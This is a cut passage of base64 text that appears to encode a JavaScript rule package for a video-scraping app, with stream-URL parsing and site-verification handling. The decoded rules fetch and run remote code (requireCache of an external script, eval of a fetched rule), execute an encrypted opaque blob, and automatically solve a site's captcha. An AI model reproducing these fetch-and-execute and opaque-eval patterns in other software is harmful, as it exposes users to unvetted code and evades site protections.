xcXFxuXFxcXG5sZXQgTWV0aG9kcz17XFxcXG4gICAgLy/lpJrpgInmqKHlnZdcXFxcbiAgICBNdWx0aVNlbGVjdE1vZGU6ZnVuY3Rpb24obmFtZSxpZCxzaHNvcnQpe1xcXFxuICAgICAgICByZXR1cm4gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZGF0YXRpdGxlLCBkYXRhdXJsLHNoc29ydCkgPT4ge1xcXFxuICAgICAgICAgICAgZnVuY3Rpb24gdW5pcXVlKGFycikge1xcXFxuICAgICAgICAgICAgY29uc3QgcmVzID0gbmV3IE1hcCgpXFxcXG4gICAgICAgICAgICByZXR1cm4gYXJyLmZpbHRlcigoYSkgPT4gIXJlcy5oYXMoYS51cmwpICYmIHJlcy5zZXQoYS51cmwsIDEpKVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbGV0IGR1b3NlbGVjdCA9IHN0b3JhZ2UwLmdldE15VmFyKHNoc29ydCtcXFxcXFxcIl9kdW9zZWxlY3RcXFxcXFxcIikgPyBzdG9yYWdlMC5nZXRNeVZhcihzaHNvcnQrXFxcXFxcXCJfZHVvc2VsZWN0XFxcXFxcXCIpIDogW107XFxcXG4gICAgICAgICAgICBpZiAoZHVvc2VsZWN0LmZpbmRJbmRleCh4ID0+IHgudXJsID09PSBkYXRhdXJsKSA9PSAtMSkge1xcXFxuICAgICAgICAgICAgICAgIGR1b3NlbGVjdC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGRhdGF0aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBkYXRhdXJsXFxcXG4gICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICBkdW9zZWxlY3QgPSB1bmlxdWUoZHVvc2VsZWN0KVxcXFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oZGF0YXVybCwge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogYOKAnOKAnOKAneKAnTxzcGFuIHN0eWxlPVxcXFxcXFwiY29sb3I6I0ZGNTczM1xcXFxcXFwiPmAgKyBkYXRhdGl0bGUsXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHJlbW92ZUJ5VmFsdWUoYXJyLCB2YWwpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhcnJbaV1bJ3VybCddID09IHZhbCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyci5zcGxpY2UoaSwgMSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgcmVtb3ZlQnlWYWx1ZShkdW9zZWxlY3QsIGRhdGF1cmwpXFxcXG4gICAgICAgICAgICAgICAgdXBkYXRlSXRlbShkYXRhdXJsLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBkYXRhdGl0bGVcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKHNoc29ydCtcXFxcXFxcIl9kdW9zZWxlY3RcXFxcXFxcIiwgZHVvc2VsZWN0KTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgICAgICB9LCBuYW1lLCBpZCwgc2hzb3J0KVxcXFxuICAgIH0sXFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6YCa55So6Kej5p6Q5Y675bm/5ZGKXFxcIixcXFwicGF0aFxcXCI6XFxcImxhenlcXFwiLFxcXCJydWxlXFxcIjpcXFwidmFyIGxhenkgPSAkKCcnKS5sYXp5UnVsZSgoKSA9PiB7XFxcXG5pZiAoaW5wdXQuaW5kZXhPZignbWFnbmV0Oj94dCcpID09IC0xKSB7XFxcXG4gICAgdHJ5e1xcXFxuICAgICAgdmFyIGh0bWwgPSBKU09OLnBhcnNlKHJlcXVlc3QoaW5wdXQpLm1hdGNoKC9yIHBsYXllcl8uKj89KC4qPyk8LylbMV0pXFxcXG4gICAgdmFyIHVybCA9IGh0bWwudXJsXFxcXG4gICAgaWYgKGh0bWwuZW5jcnlwdCA9PSAnMScpIHtcXFxcbiAgICAgICAgdXJsID0gdW5lc2NhcGUodXJsKTtcXFxcbiAgICB9IGVsc2UgaWYgKGh0bWwuZW5jcnlwdCA9PSAnMicpIHtcXFxcbiAgICAgICAgdXJsID0gdW5lc2NhcGUoYmFzZTY0RGVjb2RlKHVybCkpO1xcXFxuICAgIH1cXFxcbiAgICBpZiAoL20zdTh8bXA0fGZsdi8udGVzdCh1cmwpKSB7XFxcXG4gICAgICAgaWYgKC92aXB8aGQvLnRlc3QodXJsKSkge1xcXFxyXFxcXG4gICAgICAgICAgIGV2YWxQcml2YXRlSlMoJ1R1U0pkcG5aYXFYR1J2dk9GUlIrM1M3ZVpVamVDMUNmZkZiSGhvbzBlNSthWjdLYXY5S1pWWnNma3dLa1VGZjR3emtUcmlvNGpBUkg2WndUWHBSbEgza0k0M3JXQ1RVNFBkWWFtMTVwUFlpcTVjVzBINmdVWGhKVzd0bUp0eUxLZGplMUthcEJJR3ZXYVhJMFdtb0hvTUVGQlYvTUFpY21QZ3B5QUpaanNjNUVtdmRoMW43MldQUGl5aFlOQ29Nblo5SnBQNmFFc1dRRW1RTWNBalB4Z3M2VU12c08vUE93NUNjcjc5c0p6aWNzdC9MbDNJT2o1TStQdnFLclRkNjE0N1ZHUEV6dGpzVWVFdWRBU3pUY24rOTVDOVZnMXV3VXZkOXowdzVxc1Bib1FoNW9aaFR5czRSUUV6QkdJcXVsUU1BQVFZNElGa2FuV1g5NUVJTlpEWDUwbUFpT1NHeUlkMDZIc3ByQWVsL2ZoN3d5TVhkbWV1K1MxNVhuY083VXV1ak1PbUdnU0FFTi9Tc2MyZXpreGxHdnBkeWhibDRwNERhUXVnL25yZ3N3aFpqNzUvTTUzc0tZWDJ6UmdPU1Q3Q01qVi8rcFBKZDFLUDkzNHV1L1ZzQlFVRzY5bVdOK0thRldoS253QlBoVjlxZHFHei9MU0puRnhJdlE4a0J4JylcXFxcbiAgICAgICAgICAgcmV0dXJuIHUgKyBcXFxcXFxcIj91cmw9XFxcXFxcXCIgKyBiYXNlNjRFbmNvZGUodXJsKSArIFxcXFxcXFwiIy5tM3U4XFxcXFxcXCI7XFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgIHJldHVybiB1cmxcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICByZXF1aXJlQ2FjaGUoJ2h0dHBzOi8vYWdpdC5haS9semsyMzU1OS9QdWJsaWNSdWxlL3Jhdy9icmFuY2gvbWFzdGVyL3g1cnVsZS5qcycsIDI0KTtcXFxcbiAgICAgICAgcmV0dXJuIHg1cnVsZShpbnB1dCwgaW5wdXQpO1xcXFxuICB9XFxcXG59Y2F0Y2goZSl7XFxcXG4vL3JlcXVpcmVDYWNoZSgnaHR0cHM6Ly9hZ2l0LmFpL2x6azIzNTU5L1B1YmxpY1J1bGUvcmF3L2JyYW5jaC9tYXN0ZXIveDVydWxlLmpzJywgMjQpO1xcXFxuICAgICAgICAvL3JldHVybiB4NXJ1bGUoaW5wdXQsIGlucHV0KTtcXFxcbiAgICAgICAgcmV0dXJuICd2aWRlbzovLycgKyBpbnB1dDtcXFxcbn0gICBcXFxcbiB9IGVsc2Uge1xcXFxuICAgICAgICByZXR1cm4gaW5wdXRcXFxcbiAgICB9XFxcXG59KVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIumqjOivgeeggVxcXCIsXFxcInBhdGhcXFwiOlxcXCJ5em1cXFwiLFxcXCJydWxlXFxcIjpcXFwid2hpbGUgKC/ovpPlhaXpqozor4HnoIF857O757uf5a6J5YWo6aqM6K+BLy50ZXN0KGh0bWwpKSB7XFxcXG4gICAgbGV0IGhlYWRlcnMgPSB7XFxcXG4gICAgICAgIFxcXFxcXFwiVXNlci1BZ2VudFxcXFxcXFwiOiBNT0JJTEVfVUEsXFxcXG4gICAgICAgIFxcXFxcXFwiUmVmZXJlclxcXFxcXFwiOiBNWV9VUkxcXFxcbiAgICB9XFxcXG4gICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9qeGhzP3J1bGU95qih5p2/wrdRJykpLnJ1bGUpO1xcXFxuICAgIGV2YWxQcml2YXRlSlMoc3N5eik7XFxcXG5cXFxcbiAgICBsZXQgdmNvZGUgPSBnZXRWQ29kZTIoTVlfSE9NRSArICcvaW5kZXgucGhwL3ZlcmlmeS9pbmRleC5odG1sPycsIEpTT04uc3RyaW5naWZ5KGhlYWRlcnMpLCAnbnVtJyk7XFxcXG4gICAgZmV0Y2goTVlfSE9NRSArIGh0bWwubWF0Y2goL1xcXFxcXFxcL2luZGV4LnBocC4qP3ZlcmlmeT0vKVswXSArIEpTT04ucGFyc2UodmNvZGUpLnJldCwge1xcXFxuICAgICAgICBoZWFkZXJzOiBoZWFkZXJzLFxcXFxuICAgICAgICBtZXRob2Q6ICdQT1NUJ1xcXFxuICAgIH0pXFxcXG4gICAgdmFyIHl6ID0gTVlfVFlQRSA9PSAnaG9tZScgPyB0cnVlX3VybCA6IE1ZX1VSTFxcXFxuICAgIGxvZyhNWV9UWVBFKVxcXFxuICAgIGh0bWwgPSByZXF1ZXN0KHl6LCB7XFxcXG4gICAgICAgIC8vICAgaGVhZGVyczogaGVhZGVyc1xcXFxuICAgIH0pXFxcXG59XFxcXG5pZiAoL+mikee5geaTjeS9nC8udGVzdChodG1sKSkge1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgdGl0bGU6ICfnvZHnq5nmkJzntKLml7bpl7Tpl7TpmpQnLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwi5LiL5ouJ6YeN6K+VXFxcXFxcXCJcXFxcbn0pXFxcXG5cXFxcbn1cXFwifV1cIn0iLCJwaWNVcmwiOiJodHRwczovL2ltZzkuZG91YmFuaW8uY29tL3ZpZXcvcGhvdG8vbF9yYXRpb19wb3N0ZXIvcHVibGljL3AyODkyOTU2Nzc2LndlYnBAUmVmZXJlcj1odHRwczovL2ltZzkuZG91YmFuaW8uY29tLyIsInRpdGxlIjoi5bCB56We56ys5LiA6YOoIn0=
